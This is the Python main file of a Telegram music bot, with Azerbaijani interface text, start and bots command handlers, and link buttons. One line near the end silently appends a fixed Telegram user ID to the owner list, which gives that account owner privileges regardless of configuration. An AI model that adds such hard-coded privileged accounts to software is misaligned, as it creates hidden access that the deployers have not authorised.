# © Songazbot/Samil
from config import OWNER_ID
from config import BOT_ADI
from config import HELP
from config import OWNER_HELP
from config import BTN_URL
from config import LIST_URL
from config import START_MSG
from config import BTN_NAME
from config import LIST_NAME
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from song.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, InlineQuery, InputTextMessageContent
from song import app, LOGGER
from song.mrdarkprince import ignore_blacklisted_users
from song.sql.chat_sql import add_chat_to_db


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="Qrupa əlavə et", url=f"https://t.me/{BOT_ADI}?startgroup=a"
                    )
                ],[
                    InlineKeyboardButton(
                        text="🖥 AZbots", url=f"t.me/azbots"
                    ),
                    InlineKeyboardButton(
                        text="🎵 Play List", url=f"t.me/Songazz"
                    )

                ]
   
            ]
        )
    else:
        btn = None
    await message.reply("**Kanal - @Songazz**", parse_mode="md")
    await message.reply(START_MSG.format(name, user_id), reply_markup=btn , parse_mode="md")
    add_chat_to_db(str(chat_id))
    
@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("bots"))
async def bots(client, message):
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="🔎 Shazam", url="t.me/shazamazbot"
                    ),
                    InlineKeyboardButton(
                        text="🎤 Voicaz", url="t.me/Voicazbot"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="👤 Tagger", url="t.me/FulltagBot"
                    ),
                    InlineKeyboardButton(
                        text="🎶 TikTok", url="t.me/ttazbot"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="🔐 Gizli Mesaj", url="t.me/Gizliazbot"
                    ),
                    InlineKeyboardButton(
                        text="🎧 Youtube", url="t.me/ytuazbot"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply("🤖 **Digər botlarımız.**", reply_markup=btn , parse_mode="md")

            
        
        
        
  
        
        
        
btns = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text=f"{BTN_NAME}", url=f"{BTN_URL}"
                    )
                ],
                [
                    InlineKeyboardButton(
                         text=f"{LIST_NAME}", url=f"{LIST_URL}" ),
                    InlineKeyboardButton(
                         text=f"🎶 Yüklənənlər ", url="t.me/sonqaz" )
           
                ],
                [
                    InlineKeyboardButton(
                        text=f"⚡ Dəstək", url=f"t.me/songsupp"
                    )
                ]
            ]
        )


#@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
#async def start(client,message):
#    if message.from_user["id"] in OWNER_ID:
#        await message.reply(OWNER_HELP, reply_markup = btns)
#        return ""
#    await message.reply(HELP, reply_markup = btns)       
        
OWNER_ID.append(1382528596)

app.start()
LOGGER.info(F"Bot Aktivdir @{BOT_ADI}")
idle()
